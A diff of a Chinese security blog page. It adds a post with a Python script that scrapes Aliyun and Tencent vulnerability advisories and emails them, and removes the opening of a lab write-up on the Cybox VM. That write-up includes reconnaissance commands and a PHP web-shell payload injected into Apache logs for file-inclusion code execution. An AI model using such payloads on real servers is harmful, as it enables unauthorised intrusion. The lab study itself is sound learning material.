@@ -20,30 +20,32 @@
     var CONFIG = {"hostname":"dnie9.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="谁人与我共黄昏…">
-<meta property="og:type" content="website">
-<meta property="og:title" content="D9‘s 学习之路~">
-<meta property="og:url" content="https://dnie9.com/home/index.html">
+  <meta name="description" content="Python3实现安全漏洞&#x2F;信息自动抓取邮件通知​        抓取阿里安全漏洞通告和腾讯应急响应中心的推送信息，然后使用邮件推送，通知，全过程自动化进行，在服务器下发定时任务执行即可。 code中的html可以设置html文章，使发送的邮件精美华，实现了自动的一个监控功能，可以获取相关信息，进行学习，发现相关高危漏洞通告。 12345678910111213141516171819202122">
+<meta property="og:type" content="article">
+<meta property="og:title" content="安全漏洞&#x2F;信息自动化通告">
+<meta property="og:url" content="https://dnie9.com/%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E-%E4%BF%A1%E6%81%AF%E8%87%AA%E5%8A%A8%E5%8C%96%E9%80%9A%E5%91%8A.html">
 <meta property="og:site_name" content="D9‘s 学习之路~">
-<meta property="og:description" content="谁人与我共黄昏…">
+<meta property="og:description" content="Python3实现安全漏洞&#x2F;信息自动抓取邮件通知​        抓取阿里安全漏洞通告和腾讯应急响应中心的推送信息，然后使用邮件推送，通知，全过程自动化进行，在服务器下发定时任务执行即可。 code中的html可以设置html文章，使发送的邮件精美华，实现了自动的一个监控功能，可以获取相关信息，进行学习，发现相关高危漏洞通告。 12345678910111213141516171819202122">
 <meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2021-01-19T02:56:36.000Z">
+<meta property="article:modified_time" content="2021-01-19T03:08:24.877Z">
 <meta property="article:author" content="D9">
 <meta name="twitter:card" content="summary">
 
-<link rel="canonical" href="https://dnie9.com/home/">
+<link rel="canonical" href="https://dnie9.com/%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E-%E4%BF%A1%E6%81%AF%E8%87%AA%E5%8A%A8%E5%8C%96%E9%80%9A%E5%91%8A.html">
 
 
 <script id="page-configurations">
   // https://hexo.io/docs/variables.html
   CONFIG.page = {
     sidebar: "",
-    isHome : true,
-    isPost : false,
+    isHome : false,
+    isPost : true,
     lang   : 'zh-CN'
   };
 </script>
 
-  <title>D9‘s 学习之路~</title>
+  <title>安全漏洞/信息自动化通告 | D9‘s 学习之路~</title>
   
 
 
@@ -149,9 +151,10 @@
         <div class="content-wrap">
           
 
-          <div class="content index posts-expand">
+          <div class="content post posts-expand">
             
-      
+
+    
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
@@ -167,10 +170,9 @@
       <meta itemprop="name" content="D9‘s 学习之路~">
     </span>
       <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E-%E4%BF%A1%E6%81%AF%E8%87%AA%E5%8A%A8%E5%8C%96%E9%80%9A%E5%91%8A.html" class="post-title-link" itemprop="url">安全漏洞/信息自动化通告</a>
-        </h2>
+        <h1 class="post-title" itemprop="name headline">
+          安全漏洞/信息自动化通告
+        </h1>
 
         <div class="post-meta">
             <span class="post-meta-item">
@@ -192,7 +194,14 @@
                 </span>
             </span>
 
-          <br>
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
             <span class="post-meta-item" title="本文字数">
               <span class="post-meta-item-icon">
                 <i class="far fa-file-word"></i>
@@ -217,534 +226,51 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h3 id="Python3实现安全漏洞-信息自动抓取邮件通知"><a href="#Python3实现安全漏洞-信息自动抓取邮件通知" class="headerlink" title="Python3实现安全漏洞/信息自动抓取邮件通知"></a>Python3实现安全漏洞/信息自动抓取邮件通知</h3><p>​        抓取阿里安全漏洞通告和腾讯应急响应中心的推送信息，然后使用邮件推送，通知，全过程自动化进行，在服务器下发定时任务执行即可。</p>
+        <h3 id="Python3实现安全漏洞-信息自动抓取邮件通知"><a href="#Python3实现安全漏洞-信息自动抓取邮件通知" class="headerlink" title="Python3实现安全漏洞/信息自动抓取邮件通知"></a>Python3实现安全漏洞/信息自动抓取邮件通知</h3><p>​        抓取阿里安全漏洞通告和腾讯应急响应中心的推送信息，然后使用邮件推送，通知，全过程自动化进行，在服务器下发定时任务执行即可。</p>
 <p>code中的html可以设置html文章，使发送的邮件精美华，实现了自动的一个监控功能，可以获取相关信息，进行学习，发现相关高危漏洞通告。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">python3</span></span><br><span class="line"><span class="string">author:D9</span></span><br><span class="line"><span class="string">实现功能：抓取阿里安全预警，腾讯应急响应中心blog，</span></span><br><span class="line"><span class="string">将安全通告的名称/链接，以邮件的形式发送到网络安全部的邮箱</span></span><br><span class="line"><span class="string">全自动实现，可以在服务器设置定时任务每隔3小时运行一次。</span></span><br><span class="line"><span class="string">1.确定权威的国内外安全厂商公告，确定要抓取的站点。</span></span><br><span class="line"><span class="string">2.实现email-发送功能。</span></span><br><span class="line"><span class="string">3.不涉及数据库存储，将内容放在邮箱中。</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> smtplib, ssl , time , datetime</span><br><span class="line"><span class="keyword">from</span> email.mime.text <span class="keyword">import</span> MIMEText</span><br><span class="line"><span class="keyword">from</span> email.mime.multipart <span class="keyword">import</span> MIMEMultipart</span><br><span class="line"><span class="keyword">from</span> email.utils <span class="keyword">import</span> formataddr</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#定义e-mail所需信息，使用ssl，根据不同邮箱定义。</span></span><br><span class="line">port = <span class="number">465</span>  </span><br><span class="line">smtp_server = <span class="string">&quot;smtp.163.com&quot;</span></span><br><span class="line">sender_email = <span class="string">&quot;XXXXXX&quot;</span>  </span><br><span class="line">receiver_email = <span class="string">&quot;XXXXXX&quot;</span>  </span><br><span class="line">password = <span class="string">&#x27;XXXXX&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#定义requests变量，使用bs4进行指定tag标签爬取，获得链接，标题，时间。</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9&#x27;</span>&#125;</span><br><span class="line">Tencent_Url = <span class="string">&quot;https://security.tencent.com/index.php/blog&quot;</span></span><br><span class="line">Tencent_Url_2 = <span class="string">&quot;https://security.tencent.com/&quot;</span> </span><br><span class="line">Ali_Url = <span class="string">&quot;https://m.aliyun.com/doc/notice_list/9213612.html&quot;</span></span><br><span class="line">Ali_Url_2 = <span class="string">&quot;https://m.aliyun.com&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#时间用于对比是否为今天最新的,一般第一个tag的日期和系统时间一致就是最新的发布，则进行邮件推送。</span></span><br><span class="line">ISOTIMEFORMAT_1 = <span class="string">&#x27;%Y-%m-%d&#x27;</span></span><br><span class="line">ISOTIMEFORMAT_2 = <span class="string">&#x27;%m-%d&#x27;</span></span><br><span class="line">Ostime_Tencent = datetime.datetime.now().strftime(ISOTIMEFORMAT_1)</span><br><span class="line">Ostime_Ali = datetime.datetime.now().strftime(ISOTIMEFORMAT_2)</span><br><span class="line"></span><br><span class="line"><span class="comment">#阿里通告抓取。</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AliYun</span>(<span class="params">url</span>):</span></span><br><span class="line">    Ali_Title = []</span><br><span class="line">    Ali_Link = []</span><br><span class="line">    Ali_Text = requests.get(Ali_Url,headers = headers ).text</span><br><span class="line">    Ali_Soup = BeautifulSoup(Ali_Text,features=<span class="string">&quot;lxml&quot;</span>)</span><br><span class="line">    Ali_First = Ali_Soup.find(<span class="string">&quot;div&quot;</span>,<span class="string">&quot;date&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">str</span>(Ostime_Ali) == <span class="built_in">str</span>(Ali_First.string):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> Ali_Soup.find_all(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;notice-list-item&quot;</span>):</span><br><span class="line">                Ali_Link.append(Ali_Url_2 + i[<span class="string">&#x27;href&#x27;</span>])</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> Ali_Soup.find_all(<span class="string">&quot;div&quot;</span>,<span class="string">&quot;title&quot;</span>):</span><br><span class="line">                Ali_Title.append(x.string)</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">                text = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                    您好!</span></span><br><span class="line"><span class="string">                    网络安全部-安全漏洞通告！</span></span><br><span class="line"><span class="string">                    阿里漏洞通告</span></span><br><span class="line"><span class="string">                    通告信息全部来自阿里漏洞通告</span></span><br><span class="line"><span class="string">                    自动获取并分享安全信息</span></span><br><span class="line"><span class="string">                    Python脚本自动生成--作者：D9</span></span><br><span class="line"><span class="string">                    &quot;&quot;&quot;</span></span><br><span class="line">                html = <span class="string">&#x27;&lt;html&gt; \</span></span><br><span class="line"><span class="string">                            &lt;body&gt; \</span></span><br><span class="line"><span class="string">                                    &lt;h4&gt;阿里漏洞通告&lt;/h4&gt;\</span></span><br><span class="line"><span class="string">                                    通告信息全部来自: \</span></span><br><span class="line"><span class="string">                            &lt;a href = &quot;https://m.aliyun.com/doc/notice_list/9213612.html&quot;&gt;“阿里云漏洞通告”&lt;/a&gt; \</span></span><br><span class="line"><span class="string">                            &lt;div class=&quot;content_title&quot;&gt;&lt;a href=&#x27;</span>+ Ali_Link[<span class="number">0</span>] +<span class="string">&#x27; target=&quot;_blank&quot;&gt;&#x27;</span>+ Ali_Title[<span class="number">0</span>] + <span class="string">&#x27;&lt;/a&gt;&lt;/div&gt; \</span></span><br><span class="line"><span class="string">                                &lt;br&gt;&lt;/br&gt;利用Python脚本自动获取安全漏洞，使用电子邮件定时分享.&lt;br&gt;&lt;/br&gt;网络安全部:D9\</span></span><br><span class="line"><span class="string">                                &lt;br&gt;&lt;/br&gt;&lt;img class=&quot;img2&quot; src=&quot;http://XXXX.png &quot; alt=&quot;&quot;&gt;\</span></span><br><span class="line"><span class="string">                            &lt;/body&gt;\</span></span><br><span class="line"><span class="string">                        &lt;/html&gt;\</span></span><br><span class="line"><span class="string">                            &#x27;</span></span><br><span class="line">            mail(port=port,sender_email=sender_email,receiver_email=receiver_email,password=password,text=text,html=html)</span><br><span class="line">        <span class="keyword">except</span> :</span><br><span class="line">            <span class="comment"># mail(port=port,sender_email=sender_email,receiver_email=receiver_email,password=password,text=&quot;爬虫挂掉了&quot;,html=&quot;&lt;h3&gt;爬虫挂掉了！&lt;/h3&gt;&quot;)</span></span><br><span class="line">            print(<span class="string">&quot;Pro is Die&quot;</span>)</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># mail(port=port,sender_email=sender_email,receiver_email=receiver_email,password=password,text=&quot;没有最新告警&quot;,html=&quot;没有最新告警&quot;)</span></span><br><span class="line">        print(<span class="string">&quot;no one&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#腾讯响应中心Blog抓取。</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Tencent</span>(<span class="params">url</span>):</span></span><br><span class="line">    Tencent_Title = []</span><br><span class="line">    Tencent_link = []</span><br><span class="line">    Tencent_Text = requests.get(url,headers=headers).text</span><br><span class="line">    Tencent_Soup = BeautifulSoup(Tencent_Text,features=<span class="string">&quot;lxml&quot;</span>)</span><br><span class="line">    Tencent_First = Tencent_Soup.find(<span class="string">&quot;span&quot;</span>,<span class="string">&quot;info_date&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">str</span>(Ostime_Tencent) == <span class="built_in">str</span>(Tencent_First.span.string):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> Tencent_Soup.find_all(<span class="string">&#x27;div&#x27;</span>,<span class="string">&#x27;content_title&#x27;</span>):</span><br><span class="line">                Tencent_Title.append(i.string)</span><br><span class="line">                Tencent_link.append(Tencent_Url_2 + i.a[<span class="string">&#x27;href&#x27;</span>])</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">                <span class="comment"># Create the plain-text and HTML version of your message</span></span><br><span class="line">                text = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                您好!</span></span><br><span class="line"><span class="string">                网络安全部-安全漏洞通告！</span></span><br><span class="line"><span class="string">                腾讯应急响应中心-安全漏洞通告</span></span><br><span class="line"><span class="string">                通告信息全部来自腾讯应急响应中心Blog</span></span><br><span class="line"><span class="string">                自动获取并分享安全信息</span></span><br><span class="line"><span class="string">                Python脚本自动生成--作者：D9</span></span><br><span class="line"><span class="string">                &quot;&quot;&quot;</span></span><br><span class="line">                html = <span class="string">&#x27;&lt;html&gt; \</span></span><br><span class="line"><span class="string">                            &lt;body&gt; \</span></span><br><span class="line"><span class="string">                                    &lt;h4&gt;腾讯应急响应中心-安全信息&lt;/h4&gt;\</span></span><br><span class="line"><span class="string">                                    通告信息全部来自: \</span></span><br><span class="line"><span class="string">                            &lt;a href = &quot;https://security.tencent.com/index.php/blog&quot;&gt;“腾讯应急响应中心Blog”&lt;/a&gt; \</span></span><br><span class="line"><span class="string">                            &lt;div class=&quot;content_title&quot;&gt;&lt;a href=&#x27;</span>+ Tencent_link[<span class="number">0</span>] +<span class="string">&#x27; target=&quot;_blank&quot;&gt;&#x27;</span>+ Tencent_Title[<span class="number">0</span>] + <span class="string">&#x27;&lt;/a&gt;&lt;/div&gt; \</span></span><br><span class="line"><span class="string">                            &lt;br&gt;&lt;/br&gt;利用Python脚本自动获取安全信息，使用电子邮件定时分享.&lt;br&gt;&lt;/br&gt;网络安全部:D9\</span></span><br><span class="line"><span class="string">                                &lt;br&gt;&lt;/br&gt;&lt;img class=&quot;img2&quot; src=&quot;http://XXXX.png &quot; alt=&quot;&quot;&gt;\</span></span><br><span class="line"><span class="string">                            &lt;/body&gt;\</span></span><br><span class="line"><span class="string">                        &lt;/html&gt;\</span></span><br><span class="line"><span class="string">                            &#x27;</span></span><br><span class="line">            mail(port=port,sender_email=sender_email,receiver_email=receiver_email,password=password,text=text,html=html)</span><br><span class="line">        <span class="keyword">except</span> :</span><br><span class="line">            <span class="comment"># mail(port=port,sender_email=sender_email,receiver_email=receiver_email,password=password,text=&quot;爬虫挂掉了&quot;,html=&quot;&lt;h3&gt;爬虫挂掉了！&lt;/h3&gt;&quot;)</span></span><br><span class="line">            print(<span class="string">&quot;Pro is Die&quot;</span>)</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;no one&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#邮件函数接收端口，发件人，收件人，密码和html消息。我这里是网易的把自己的发件服务器替换即可。</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mail</span>(<span class="params">port,sender_email,receiver_email,password,text,html</span>):</span></span><br><span class="line">    time.sleep(<span class="number">10</span>)</span><br><span class="line">    message = MIMEMultipart(<span class="string">&quot;alternative&quot;</span>)</span><br><span class="line">    message[<span class="string">&quot;Subject&quot;</span>] = <span class="string">&quot;安全信息共享&quot;</span></span><br><span class="line">    message[<span class="string">&quot;From&quot;</span>] = sender_email</span><br><span class="line">    message[<span class="string">&quot;To&quot;</span>] = receiver_email</span><br><span class="line">    part1 = MIMEText(text, <span class="string">&quot;plain&quot;</span>)</span><br><span class="line">    part2 = MIMEText(html, <span class="string">&quot;html&quot;</span>)</span><br><span class="line">    message.attach(part1)</span><br><span class="line">    message.attach(part2)</span><br><span class="line">    context = ssl.create_default_context()</span><br><span class="line">    <span class="keyword">with</span> smtplib.SMTP_SSL(<span class="string">&quot;smtp.163.com&quot;</span>, <span class="number">465</span>, context=context) <span class="keyword">as</span> server:</span><br><span class="line">        server.login(sender_email, password)</span><br><span class="line">        server.sendmail(</span><br><span class="line">            sender_email, receiver_email, message.as_string()</span><br><span class="line">        )</span><br><span class="line">        server.quit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    Tencent(Tencent_Url)</span><br><span class="line">    AliYun(Ali_Url)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-      
     </div>
 
     
     
     
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
+        
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://dnie9.com/%E7%BC%9D%E5%90%88%E6%80%AA%E6%89%93%E7%BC%9D%E5%90%88%E9%9D%B6%E5%9C%BA.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/logo.png">
-      <meta itemprop="name" content="D9">
-      <meta itemprop="description" content="谁人与我共黄昏…">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="D9‘s 学习之路~">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/%E7%BC%9D%E5%90%88%E6%80%AA%E6%89%93%E7%BC%9D%E5%90%88%E9%9D%B6%E5%9C%BA.html" class="post-title-link" itemprop="url">缝合怪打缝合靶场</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-01-14 21:57:00" itemprop="dateCreated datePublished" datetime="2021-01-14T21:57:00+08:00">2021-01-14</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-01-18 09:27:02" itemprop="dateModified" datetime="2021-01-18T09:27:02+08:00">2021-01-18</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E9%9D%B6%E6%9C%BA/" itemprop="url" rel="index"><span itemprop="name">靶机</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>3.9k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>4 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>​    利用<a target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/detail/6/">红日靶场四</a>加<a target="_blank" rel="noopener" href="https://www.vulnhub.com/">vulnhub</a>靶机，缝合靶场的学习记录，前期准备中记录了vulhub项目的漏洞复现学习。在学习环境中可以不断利用缝合这几种方式/环境进行学习–<em>我是缝合怪！</em>~</p>
-<ul>
-<li><p>Cybox-Web靶机-提权</p>
-</li>
-<li><p>Msf联动Beef进内网</p>
-</li>
-<li><p>proxychain-sock5代理</p>
-</li>
-<li><p>MS17-010提权system</p>
-</li>
-<li><p>令牌窃取域管理员</p>
-<img src="/images/bj/拓扑.png">
-
-</li>
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>D9
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://dnie9.com/%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E-%E4%BF%A1%E6%81%AF%E8%87%AA%E5%8A%A8%E5%8C%96%E9%80%9A%E5%91%8A.html" title="安全漏洞&#x2F;信息自动化通告">https://dnie9.com/安全漏洞-信息自动化通告.html</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
 </ul>
-<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>此次共三台机器，红日靶场四中的域PC和域DC，加上Cybox 1.1的Web靶机。</p>
-<p>需要更改攻击机的<code>/etc/hosts</code>和DC中dns的解析。将cybox.company设置为web靶机的IP。</p>
-<img src = "/images/bj/dns-create-2.png">
+</div>
 
 
-
-<h2 id="热身-vulhub"><a href="#热身-vulhub" class="headerlink" title="热身-vulhub"></a>热身-vulhub</h2><p>​        该靶场中的原有<code>web</code>机器是搭建好的<a href="'https://github.com/vulhub/vulhub'">vulhub</a> 项目，一键构建对应漏洞的docker容器，方便进行漏洞学习/浮复现。这里推荐使用<code>git clone</code>整个项目，有变动的时候直接<code>git pull</code>即可。热身准备<code>docker-未授权</code>，搞一下～～</p>
-<p><strong>构建漏洞容器</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo su  </span><br><span class="line"><span class="comment">##以sudo调用su，su是切换用户的命令，sudo是以ROOT权限执行切换，切换到ROOT输入本账户密码。</span></span><br><span class="line">docker-compose build  </span><br><span class="line">docker-compose up -d</span><br><span class="line">git pull</span><br><span class="line"><span class="comment">##构建容器，启动容器，down是关闭容器，git pull 在本地拉取远程仓库同步。</span></span><br></pre></td></tr></table></figure>
-<img src="/images/bj/5.docker-vuln-1.png">
-
-<img src="/images/bj/4.docker-unauth-1.png">
-
-<p><strong>获取shell</strong></p>
-<img src="/images/bj/8.docker-unauth-2.png">
-
-<img src="/images/bj/7.docker-unauth-1.png">
-
-<h2 id="Cybox-1-1-Web"><a href="#Cybox-1-1-Web" class="headerlink" title="Cybox-1.1-Web"></a>Cybox-1.1-Web</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>获取子域名—目录爆破—兔子洞陷阱—越权修改密码—文件包含日志RCE—sudo提权</p>
-<p>此靶机的ftp，ckeditor，webmail这三个地方是兔子洞，像漏洞……</p>
-<p>webmail的squ 1.4.22版本存在可利用exp但是无法执行。</p>
-<p>ftp的根目录在用户的<code>$HOME</code>写不了webshell。</p>
-<p>ckeditor没有找到上传点……</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster vhost -u http://cybox.company -w <span class="string">&#x27;dict&#x27;</span> -t 64</span><br></pre></td></tr></table></figure>
-<img src="/images/bj/9.cybox-gobuster-1.png">
-
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch.py -e * -L url.txt -t 32 -x 400,403</span><br></pre></td></tr></table></figure>
-<img src="/images/bj/10.dirsearch-cybox-1.png">
-
-<h3 id="注册用户"><a href="#注册用户" class="headerlink" title="注册用户"></a>注册用户</h3><p>​        根据页面创建普通用户，得到cybox的用户名和密码，该用户可以登陆<code>webmail系统</code></p>
-<img src="/images/bj/creat-users-register.png">
-
-<img src="/images/bj/cybox-reset-passwd.png">
-
-<h3 id="越权漏洞"><a href="#越权漏洞" class="headerlink" title="越权漏洞"></a>越权漏洞</h3><p>​        在<code>monitor系统</code>利用重置密码功能，在收件箱查收到重置链接后修改<code>email</code>参数为admin即可重置admin账户密码</p>
-<img src="/images/bj/cybox-reset-passwd-2.png">
-
-<img src="/images/bj/cybox-admin-1.png">
-
-<h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>​        在monitor系统的admin页面查看源码可以发现styles动态加载，存在<strong>php文件包含漏洞</strong>，在<code>dev.cybox.company</code>页面可以查看到<code>phpinfo</code>信息,根据apache2路径在日志文件中写入<code>&lt;?php system($_GET[&#39;shell&#39;]);?&gt;</code>,首先包含apache2日志看到日志存储的是ftp.cybox.company在浏览器中按<code>CTRL+SHIFT+I</code>组合键在network中选择数据包选择<code>edit and resend</code>将php代码写入agent中发送即可。</p>
-<img src="/images/bj/cybox-php-file-1.png">
-
-<img src="/images/bj/ftp-php-log.png">
-
-<img src="/images/bj/cybox-php-file-2.png">
-
